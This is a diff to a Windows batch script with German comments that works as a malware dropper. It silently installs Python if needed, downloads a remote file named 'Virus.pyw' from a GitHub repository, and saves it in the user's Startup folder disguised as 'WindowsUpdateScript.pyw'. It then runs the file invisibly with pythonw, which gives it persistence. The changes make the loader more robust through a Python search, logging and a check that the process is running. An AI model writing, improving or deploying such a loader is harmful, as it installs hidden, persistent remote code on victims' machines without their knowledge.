@@ -6,22 +6,77 @@ set "INSTALLER=python-3.12.0.exe"
 set "SCRIPT_URL=https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/Virus.pyw"
 set "SCRIPT_NAME=WindowsUpdateScript.pyw"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "LOG=%TEMP%\startup_log.txt"
 
-python --version >nul 2>&1
-if %errorlevel% equ 0 goto :install
+echo [%date% %time%] Starte Skript > "%LOG%"
 
+:: 1. Python finden – nicht auf einen festen Pfad verlassen
+set "PYTHON="
+for %%A in (python pythonw) do (
+    for %%B in ("" "-32" ".exe") do (
+        where %%~A%%~B >nul 2>&1
+        if !errorlevel! equ 0 (
+            set "PYTHON=%%~A%%~B"
+            echo [%date% %time%] Python gefunden: !PYTHON! >> "%LOG%"
+            goto :found
+        )
+    )
+)
+
+:: 2. Wenn nicht im PATH, in typischen Installationspfaden suchen
+set "PYTHON_PATHS=%LocalAppData%\Programs\Python\Python312\pythonw.exe;%LocalAppData%\Programs\Python\Python312-32\pythonw.exe;%ProgramFiles%\Python312\pythonw.exe;%ProgramFiles(x86)%\Python312-32\pythonw.exe"
+for %%P in (%PYTHON_PATHS%) do (
+    if exist "%%P" (
+        set "PYTHON=%%P"
+        echo [%date% %time%] Python gefunden: !PYTHON! >> "%LOG%"
+        goto :found
+    )
+)
+
+:: 3. Python nicht gefunden – installieren
+echo [%date% %time%] Python nicht gefunden, installiere... >> "%LOG%"
 :download_installer
 curl -s -L "%PYTHON_URL%" -o "%INSTALLER%"
 if %errorlevel% neq 0 (
     timeout /t 2 /nobreak >nul
     goto :download_installer
 )
-
 start /wait "" "%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
 del /f /q "%INSTALLER%" >nul 2>&1
 
-:install
+:: Nach Installation nochmal suchen (meist in %LocalAppData%\Programs\Python\Python312-32\)
+if exist "%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" (
+    set "PYTHON=%LocalAppData%\Programs\Python\Python312-32\pythonw.exe"
+) else if exist "%LocalAppData%\Programs\Python\Python312\pythonw.exe" (
+    set "PYTHON=%LocalAppData%\Programs\Python\Python312\pythonw.exe"
+) else (
+    echo [%date% %time%] FEHLER: Python Installation fehlgeschlagen >> "%LOG%"
+    exit /b 1
+)
+
+:found
+echo [%date% %time%] Verwende Python: %PYTHON% >> "%LOG%"
+
+:: 4. Skript herunterladen
+echo [%date% %time%] Lade Skript herunter... >> "%LOG%"
 curl -s -L "%SCRIPT_URL%" -o "%STARTUP_DIR%\%SCRIPT_NAME%"
-timeout /t 3 /nobreak >nul
-"%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [%date% %time%] FEHLER: Download fehlgeschlagen >> "%LOG%"
+    exit /b 1
+)
+echo [%date% %time%] Skript gespeichert: %STARTUP_DIR%\%SCRIPT_NAME% >> "%LOG%"
+
+:: 5. Skript ausführen (mit pythonw, komplett unsichtbar)
+echo [%date% %time%] Starte Skript... >> "%LOG%"
+start /b "" "%PYTHON%" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+
+:: 6. Kurz warten und prüfen, ob Prozess läuft (optional)
+timeout /t 2 /nobreak >nul
+tasklist /FI "IMAGENAME eq pythonw.exe" 2>&1 | findstr /i "pythonw" >nul
+if %errorlevel% equ 0 (
+    echo [%date% %time%] Skript läuft (pythonw.exe aktiv) >> "%LOG%"
+) else (
+    echo [%date% %time%] WARNUNG: pythonw.exe scheint nicht zu laufen >> "%LOG%"
+)
+
 exit
